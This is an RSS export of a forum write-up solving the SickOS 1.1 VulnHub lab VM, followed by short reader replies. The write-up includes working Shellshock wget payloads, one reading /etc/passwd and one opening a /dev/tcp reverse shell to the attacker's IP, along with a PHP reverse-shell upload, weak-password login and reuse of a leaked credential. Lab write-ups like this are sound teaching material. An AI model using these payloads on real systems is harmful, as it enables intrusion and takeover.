@@ -1,0 +1,1110 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>[VulnHub] SickOS 1.1 Writeup</title>
+    <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799</link>
+    <description>SickOS are Vulnerable VM hosted by [VulnHub](https://vulnhub.com) that I tried after kioptrix from [Abatchy](https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms) suggestion for OSCP like vms.
+
+#### Disclaimer
+
+This guide is for educational purpose only and someone looking for OSCP preparation like I am. In this series, I will be guiding you how to root the VM without using Metasploit.
+
+VM Description:
+
+```
+Name........: SickOs1.1
+Date Release: 11 Dec 2015
+Author......: D4rk
+Series......: SickOs
+Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
+Tester(s)...: h1tch1
+Twitter.....: https://twitter.com/D4rk36
+```
+
+Download link: [SickOS 1.1](https://www.vulnhub.com/entry/sickos-11,132/)
+
+**Vulnerability Summary**
+
+* Squid Proxy misconfiguration
+* Shellshock bug
+* Wolf CMS 0.8.2 admin weak password
+* Sensitivie information disclosure
+* Local priv escape by misconfigured sudo list
+
+#### Host Discovery
+
+Because all VulnHub VM comes with random DHCP IP address for the machines, we need to identify the IP address from the VM first. In this section, we can use several methods for discovering the host.
+
+I’m using VMware for hosting the machines, but I don’t know why VMware is not showing as Vendor name in arp-scan, netdiscover or nmap. It only shows as Unknown or Intel corporate. Because of only 3 machines connected to wifi, it’s easy to determine which one is the VM.
+
+Okay, try to discover the host using 3 methods with root privilege.
+
+**Arp-Scan**
+
+```
+↳ arp-scan -l
+Interface: wlp2s0, datalink type: EN10MB (Ethernet)
+Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
+192.168.43.1    xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- Routers
+192.168.43.202  xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- VulnHub VM, MAC address is same as host
+```
+
+**Netdiscover**
+
+```
+↳ netdiscover -r 192.168.43.0/24
+ Currently scanning: Finished!   |   Our Mac is: xx:xx:xx:xx:xx:xx - 0        
+ 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 126                               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.43.1    xx:xx:xx:xx:xx:xx    01    042   Unknown vendor        
+```
+
+**Nmap**
+
+```
+↳ nmap -sn 192.168.43.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:35 WIB
+Nmap scan report for 192.168.43.1
+Host is up (0.0045s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Asustek Computer)
+Nmap scan report for 192.168.43.202
+Host is up (0.00023s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate) &lt;--- This is our target
+Nmap scan report for 192.168.43.229
+Host is up (0.14s latency).
+MAC Address: xx:xx:xx:xx:xx:xx (Apple)
+Nmap scan report for 192.168.43.94
+Host is up.
+Nmap scan report for 192.168.43.95
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 9.05 seconds
+```
+
+Nah, we have our target IP 192.168.43.202(censored MAC address). As always, we can use nmap to scan and enum open port for the machine.
+
+**Port scanning and enumeration**
+
+```
+↳ nmap -p- -T5 -A -sT -Pn 192.168.43.202   
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:39 WIB
+Nmap scan report for 192.168.43.202
+Host is up (0.00052s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported: GET HEAD
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+From the above results, we know that nmap tell us port 22 and 3128 is open. While port 8080 state is closed, it’s so weird if open port just ssh and squid proxy. What’s interesting is port 3128 for Squid Proxy. After hours of searching, I get this explanation from rapid7 and from other write-up for SickOS. As [rapid7](https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning) explanation:
+
+&gt; A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests for internal IP addresses against a misconfigured open Squid proxy exposed to the Internet, therefore performing an internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the network).
+
+I don’t want to use metasploit built-in `auxiliary/scanner/http/squid_pivot_scanning` for this. So I’m building my own tools(after understanding the attack flow) for checking open port behind misconfigured squid proxy. You can use my tool for this purpose, just clone and run it:
+
+Spose - Squid Pivoting Open Port Scanner : http://github.com/aancw/spose
+
+**Scan with proxy**
+
+```
+↳ python spose.py --proxy http://192.168.43.202:3128 --target 192.168.43.202
+Using proxy address http://192.168.43.202:3128
+192.168.43.202 22 seems OPEN 
+192.168.43.202 80 seems OPEN 
+```
+
+Gotcha! from spose we know that port 80 is open behind squid proxy.
+
+**cURL**
+
+```
+↳ curl -kv -x http://192.168.43.202:3128 http://192.168.43.202
+*   Trying 192.168.43.202...
+* TCP_NODELAY set
+* Connected to 192.168.43.202 (192.168.43.202) port 3128 (#0)
+&gt; GET http://192.168.43.202/ HTTP/1.1
+&gt; Host: 192.168.43.202
+&gt; User-Agent: curl/7.62.0
+&gt; Accept: */*
+&gt; Proxy-Connection: Keep-Alive
+&gt; 
+* HTTP 1.0, assume close after body
+&lt; HTTP/1.0 200 OK
+&lt; Date: Sun, 23 Dec 2018 15:59:53 GMT
+&lt; Server: Apache/2.2.22 (Ubuntu)
+&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 21
+&lt; Content-Type: text/html
+&lt; X-Cache: MISS from localhost
+&lt; X-Cache-Lookup: MISS from localhost:3128
+&lt; Via: 1.0 localhost (squid/3.1.19)
+* HTTP/1.0 connection set to keep alive!
+&lt; Connection: keep-alive
+&lt; 
+&lt;h1&gt;
+BLEHHH!!!
+&lt;/h1&gt;
+* Connection #0 to host 192.168.43.202 left intact
+```
+
+Hm something weird with only “BLEHH” output. Trying to scan with nikto then.
+
+**Nikto**
+
+```
+↳ nikto -h 192.168.43.202 -useproxy http://192.168.43.202:3128
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.43.202
++ Target Hostname:    192.168.43.202
++ Target Port:        80
++ Proxy:              192.168.43.202:3128
++ Start Time:         2018-12-23 23:02:04 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Retrieved via header: 1.0 localhost (squid/3.1.19)
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-cache-lookup&#39; found, with contents: MISS from localhost:3128
++ Uncommon header &#39;x-cache&#39; found, with contents: MISS from localhost
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 07:35:02 2015
++ Server banner has changed from &#39;Apache/2.2.22 (Ubuntu)&#39; to &#39;squid/3.1.19&#39; which may suggest a WAF, load balancer or proxy is in place
++ Uncommon header &#39;x-squid-error&#39; found, with contents: ERR_INVALID_REQ 0
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header &#39;tcn&#39; found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php
++ Uncommon header &#39;nikto-added-cve-2014-6271&#39; found, with contents: true
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8347 requests: 0 error(s) and 21 item(s) reported on remote host
++ End Time:           2018-12-23 23:02:17 (GMT7) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+From nikto result, the web server is vulnerable to shellsock vulnerability. Good news for us!
+
+**dirb**
+
+Using dirb for simple directory searching and found this endpoints.
+
+```
+↳ dirb http://192.168.43.202 -p 192.168.43.202:3128
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Dec 23 23:03:37 2018
+URL_BASE: http://192.168.43.202/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+PROXY: 192.168.43.202:3128
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.43.202/ ----
++ http://192.168.43.202/cgi-bin/ (CODE:403|SIZE:290)                            
++ http://192.168.43.202/connect (CODE:200|SIZE:109)                               
++ http://192.168.43.202/index (CODE:200|SIZE:21)                                  
++ http://192.168.43.202/index.php (CODE:200|SIZE:21)                                           
++ http://192.168.43.202/robots (CODE:200|SIZE:45)                                               
++ http://192.168.43.202/robots.txt (CODE:200|SIZE:45)                                           
++ http://192.168.43.202/server-status (CODE:403|SIZE:295)                                                                                                           
+-----------------
+END_TIME: Sun Dec 23 23:03:40 2018
+DOWNLOADED: 4612 - FOUND: 7
+```
+
+Checking for robots.txt and it telling us that the web server is hosted wolfcms.
+
+```
+User-agent: *
+Disallow: /
+Dissalow: /wolfcms
+```
+
+From the informations we get before, we can summarize the vulnerability by 2 attack vector.
+
+* Exploiting Machine with Shellsock
+* Finding Wolfcms Vuln
+
+As far I know, the above attack vector is resulting reverse shell for connection when success. So we can listen for incoming reverse shell connection with netcat:
+
+```
+↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+```
+
+**WolfCMS Attack Vector**
+
+Using wolfcms as attack vector for getting root shell with wolfcms 0.8.2 vulnerability. I’ve found that in this version is affected by Arbitrary File Upload vuln as mentioned in [Exploit-DB](https://www.exploit-db.com/exploits/36818). But, we need a valid credential/session for uploading reverse shell or backdoor for login credential. Trying to use a common weak password like admin:admin, admin:password and other for the login at http://192.168.43.202/wolfcms/?/admin/login
+![wolfcms-login|690x209](upload://3x3zqAPZLXWlvTgb67Ai5ugPVjC.png) 
+
+Input admin:admin for the credential and then it redirected us to administration dashboard. Good news!
+
+So, what’s next?
+
+After logging in to administrator dashboard, we can upload PHP reverse shell in file manager feature. 
+![wolfcms-upload-file|689x338](upload://eZxvdkq8sKGGEYz7O9GNm6Aq1ey.png) 
+
+Nah, we can upload the file in `public/images` directory or in `public` directory. For simple php reverse shell, you can download from [PentestMonkey.net](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and change the file with IP and port for the reverse shell as I mentioned above.
+
+```
+$ip = &#39;127.0.0.1&#39;;  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+Upload the file, access it(http://192.168.43.202/wolfcms/public/reverse.php) and see an incoming connection in netcat listening session:
+
+```
+↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+Connection from 192.168.43.202 56724 received!
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 15:38:55 up 24 min,  0 users,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ 
+```
+
+Gotcha! We have a reverse shell from our backdoor. Next, exploiting shellsock vulnerability.
+
+**Shellsock Attack Vector**
+
+We will use this attack vector for rooting the machine. If you are don’t know about shellsock, you can read the explanation from [coderwall](https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability)
+
+&gt; The **Shellshock** vulnerability, also know as **CVE-2014-6271** , allows attackers to inject their own code into [Bash](http://www.gnu.org/software/bash/) using specially crafted **environment variables**
+
+From nikto scan result, we know that affected endpoint is `cgi-bin/status` . So, we need to test this by sending a malicious crafted request with wget, curl or other tools. For simple Proof, we are sending a request to the affected endpoint with `cat /etc/passwd` for showing `/etc/passwd` content.
+
+```
+↳ wget -qO- -U &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/cat /etc/passwd&quot; -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+Aha~ our request is accepted and it shows us the content of `etc/passwd` file.
+
+Now, we can make reverse shell connection with this vuln like PHP reverse shell before. Doing simple reverse shell with `/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/attacker_port 0&gt;&amp;1`
+
+```
+↳ wget -qO- -U &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.94/4443 0&gt;&amp;1&quot; -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status
+```
+
+Uhuuu reverse shell again!
+
+```
+↳ nc -lvp 4443
+Listening on [0.0.0.0] (family 0, port 4443)
+Connection from 192.168.43.202 44354 received!
+bash: no job control in this shell
+www-data@SickOs:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@SickOs:/usr/lib/cgi-bin$ 
+```
+
+**Post Exploitation**
+
+In this section, we are going to escalating privilege from www-data to root privilege because the flag in the root directory as mentioned in instruction:
+
+```
+Get /root/a0216ea4d51874464078c618298b1367.txt
+```
+
+Searching for interesting file and credential in `/var/www/` .
+
+```
+www-data@SickOs:/var/www$ cd /var/www
+cd /var/www
+www-data@SickOs:/var/www$ ls -lah
+ls -lah
+total 24K
+drwxrwxrwx  3 root root 4.0K Dec  6  2015 .
+drwxr-xr-x 13 root root 4.0K Dec  6  2015 ..
+-rwxrwxrwx  1 root root  109 Dec  5  2015 connect.py
+-rw-r--r--  1 root root   21 Dec  5  2015 index.php
+-rw-r--r--  1 root root   45 Dec  5  2015 robots.txt
+drwxr-xr-x  5 root root 4.0K Dec  5  2015 wolfcms
+www-data@SickOs:/var/www$ 
+```
+
+```
+www-data@SickOs:/var/www$ cd wolfcms
+cd wolfcms
+www-data@SickOs:/var/www/wolfcms$ ls -lah
+ls -lah
+total 52K
+drwxr-xr-x 5 root root 4.0K Dec  5  2015 .
+drwxrwxrwx 3 root root 4.0K Dec  6  2015 ..
+-rwxr-xr-x 1 root root  950 Dec  5  2015 .htaccess
+-rwxrwxrwx 1 root root 4.0K Dec  5  2015 CONTRIBUTING.md
+-rwxrwxrwx 1 root root 2.4K Dec  5  2015 README.md
+-rwxrwxrwx 1 root root  403 Dec  5  2015 composer.json
+-rwxrwxrwx 1 root root 3.0K Dec  5  2015 config.php
+drwxrwxrwx 2 root root 4.0K Dec  5  2015 docs
+-rwxrwxrwx 1 root root  894 Dec  5  2015 favicon.ico
+-rwxrwxrwx 1 root root 6.7K Dec  5  2015 index.php
+drwxrwxrwx 4 root root 4.0K Dec  6  2015 public
+-rwxrwxrwx 1 root root    0 Dec  5  2015 robots.txt
+drwxrwxrwx 7 root root 4.0K Dec  5  2015 wolf
+www-data@SickOs:/var/www/wolfcms$ 
+```
+
+Trying to read wolfcms `config.php` and it showing us database connection for the website.
+
+```
+www-data@SickOs:/var/www/wolfcms$ cat config.php
+cat config.php
+&lt;?php 
+
+// Database information:
+// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+// The path can only be absolute path or :memory:
+// For more info look at: www.php.net/pdo
+
+// Database settings:
+define(&#39;DB_DSN&#39;, &#39;mysql:dbname=wolf;host=localhost;port=3306&#39;);
+define(&#39;DB_USER&#39;, &#39;root&#39;);
+define(&#39;DB_PASS&#39;, &#39;john@123&#39;);
+define(&#39;TABLE_PREFIX&#39;, &#39;&#39;);
+
+// Should Wolf produce PHP error messages for debugging?
+define(&#39;DEBUG&#39;, false);
+
+// Should Wolf check for updates on Wolf itself and the installed plugins?
+define(&#39;CHECK_UPDATES&#39;, true);
+
+// The number of seconds before the check for a new Wolf version times out in case of problems.
+define(&#39;CHECK_TIMEOUT&#39;, 3);
+
+// The full URL of your Wolf CMS install
+define(&#39;URL_PUBLIC&#39;, &#39;/wolfcms/&#39;);
+
+// Use httpS for the backend?
+// Before enabling this, please make sure you have a working HTTP+SSL installation.
+define(&#39;USE_HTTPS&#39;, false);
+
+// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
+// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
+// Defaults to false for backwards compatibility.
+define(&#39;COOKIE_HTTP_ONLY&#39;, false);
+
+// The virtual directory name for your Wolf CMS administration section.
+define(&#39;ADMIN_DIR&#39;, &#39;admin&#39;);
+
+// Change this setting to enable mod_rewrite. Set to &quot;true&quot; to remove the &quot;?&quot; in the URL.
+// To enable mod_rewrite, you must also change the name of &quot;_.htaccess&quot; in your
+// Wolf CMS root directory to &quot;.htaccess&quot;
+define(&#39;USE_MOD_REWRITE&#39;, false);
+
+// Add a suffix to pages (simluating static pages &#39;.html&#39;)
+define(&#39;URL_SUFFIX&#39;, &#39;.html&#39;);
+
+// Set the timezone of your choice.
+// Go here for more information on the available timezones:
+// http://php.net/timezones
+define(&#39;DEFAULT_TIMEZONE&#39;, &#39;Asia/Calcutta&#39;);
+
+// Use poormans cron solution instead of real one.
+// Only use if cron is truly not available, this works better in terms of timing
+// if you have a lot of traffic.
+define(&#39;USE_POORMANSCRON&#39;, false);
+
+// Rough interval in seconds at which poormans cron should trigger.
+// No traffic == no poormans cron run.
+define(&#39;POORMANSCRON_INTERVAL&#39;, 3600);
+
+// How long should the browser remember logged in user?
+// This relates to Login screen &quot;Remember me for xxx time&quot; checkbox at Backend Login screen
+// Default: 1800 (30 minutes)
+define (&#39;COOKIE_LIFE&#39;, 1800);  // 30 minutes
+
+// Can registered users login to backend using their email address?
+// Default: false
+define (&#39;ALLOW_LOGIN_WITH_EMAIL&#39;, false);
+
+// Should Wolf CMS block login ability on invalid password provided?
+// Default: true
+define (&#39;DELAY_ON_INVALID_LOGIN&#39;, true);
+
+// How long should the login blockade last?
+// Default: 30 seconds
+define (&#39;DELAY_ONCE_EVERY&#39;, 30); // 30 seconds
+
+// First delay starts after Nth failed login attempt
+// Default: 3
+define (&#39;DELAY_FIRST_AFTER&#39;, 3);
+
+// Secure token expiry time (prevents CSRF attacks, etc.)
+// If backend user does nothing for this time (eg. click some link) 
+// his token will expire with appropriate notification
+// Default: 900 (15 minutes)
+define (&#39;SECURE_TOKEN_EXPIRY&#39;, 900);  // 15 minutes
+```
+
+From `/etc/passwd/` we know that **sickos** user exists in this machine. Trying to su with a credential from the database connection.
+
+```
+www-data@SickOs:/usr/lib/cgi-bin$ su sickos
+su sickos
+su: must be run from a terminal
+www-data@SickOs:/usr/lib/cgi-bin$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+&lt;i-bin$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;                       
+www-data@SickOs:/usr/lib/cgi-bin$ su sickos
+su sickos
+Password: john@123
+
+sickos@SickOs:/usr/lib/cgi-bin$ id
+id
+uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+```
+
+Hm… cannot doing su because we are not running from terminal, we need to spawn tty with bash session. After that, su again and it showing us id is changed to sickos from www-data.
+
+Escalating privilege with misconfigured `sudo` .
+
+```
+sickos@SickOs:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+[sudo] password for sickos: john@123
+
+Matching Defaults entries for sickos on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sickos may run the following commands on this host:
+    (ALL : ALL) ALL
+sickos@SickOs:/usr/lib/cgi-bin$ sudo su
+sudo su
+root@SickOs:/usr/lib/cgi-bin# 
+```
+
+In the end, we can access flag file as mentioned in the instruction.
+
+```
+root@SickOs:/usr/lib/cgi-bin# cd /root 
+cd /root
+root@SickOs:~# ls -lah
+ls -lah
+total 40K
+drwx------  3 root root 4.0K Dec  6  2015 .
+drwxr-xr-x 22 root root 4.0K Sep 22  2015 ..
+-rw-r--r--  1 root root   96 Dec  6  2015 redacted-hash.txt
+-rw-------  1 root root 3.7K Dec  6  2015 .bash_history
+-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
+drwx------  2 root root 4.0K Sep 22  2015 .cache
+-rw-------  1 root root   22 Dec  5  2015 .mysql_history
+-rw-r--r--  1 root root  140 Apr 19  2012 .profile
+-rw-------  1 root root 5.2K Dec  6  2015 .viminfo
+root@SickOs:~# cat redacted-hash.txt
+cat redacted-hash.txt
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+```
+**References**:
+
+* https://g0blin.co.uk/sickos-1-1-vulnhub-writeup/
+* https://www.alternativesec.xyz/vulnhub/2017/02/16/Sick-OS/
+* http://f4l13n5n0w.github.io/blog/2015/12/24/vulnhub-sickos-1-dot-1/
+* http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</description>
+    
+    <lastBuildDate>Tue, 09 Jul 2019 04:42:50 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>[VulnHub] SickOS 1.1 Writeup</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/5</link>
+        <pubDate>Tue, 06 Aug 2019 04:58:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-14799-5</guid>
+        <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
+      </item>
+      <item>
+        <title>[VulnHub] SickOS 1.1 Writeup</title>
+        <dc:creator><![CDATA[petruknisme]]></dc:creator>
+        <description><![CDATA[
+            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> Thanks, that’s an honor for me <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
+<p><a class="mention" href="https://0x00sec.org/u/zuhrl">@zuhrl</a> Thanks, HTB is more challenging than this writeup. Get HTB subscription and then learning by solving retired machine with full of walkthrough.</p>
+          <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/4</link>
+        <pubDate>Tue, 09 Jul 2019 01:58:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-14799-4</guid>
+        <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
+      </item>
+      <item>
+        <title>[VulnHub] SickOS 1.1 Writeup</title>
+        <dc:creator><![CDATA[zuhrl]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome write-up dude. Makes me want to get into hackthebox soon myself to start applying some of my knowledge. Thanks <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/3</link>
+        <pubDate>Mon, 08 Jul 2019 19:05:22 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-14799-3</guid>
+        <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
+      </item>
+      <item>
+        <title>[VulnHub] SickOS 1.1 Writeup</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>This is awesome dude, never played SickOS.</p>
+<p>It does seem like a really straight forward root, especially if you play HTB a lot <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<p>Nice job dude! I love your writing style <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799/2</link>
+        <pubDate>Sun, 07 Jul 2019 20:28:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-14799-2</guid>
+        <source url="https://0x00sec.org/t/vulnhub-sickos-1-1-writeup/14799.rss">[VulnHub] SickOS 1.1 Writeup</source>
+      </item>
+      <item>
+        <title>[VulnHub] SickOS 1.1 Writeup</title>
+        <dc:creator><![CDATA[petruknisme]]></dc:creator>
+        <description><![CDATA[
+            <p>SickOS are Vulnerable VM hosted by <a href="https://vulnhub.com" rel="noopener nofollow ugc">VulnHub</a> that I tried after kioptrix from <a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms" rel="noopener nofollow ugc">Abatchy</a> suggestion for OSCP like vms.</p>
+<h4>Disclaimer</h4>
+<p>This guide is for educational purpose only and someone looking for OSCP preparation like I am. In this series, I will be guiding you how to root the VM without using Metasploit.</p>
+<p>VM Description:</p>
+<pre><code class="lang-auto">Name........: SickOs1.1
+Date Release: 11 Dec 2015
+Author......: D4rk
+Series......: SickOs
+Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
+Tester(s)...: h1tch1
+Twitter.....: https://twitter.com/D4rk36
+</code></pre>
+<p>Download link: <a href="https://www.vulnhub.com/entry/sickos-11,132/" rel="noopener nofollow ugc">SickOS 1.1</a></p>
+<p><strong>Vulnerability Summary</strong></p>
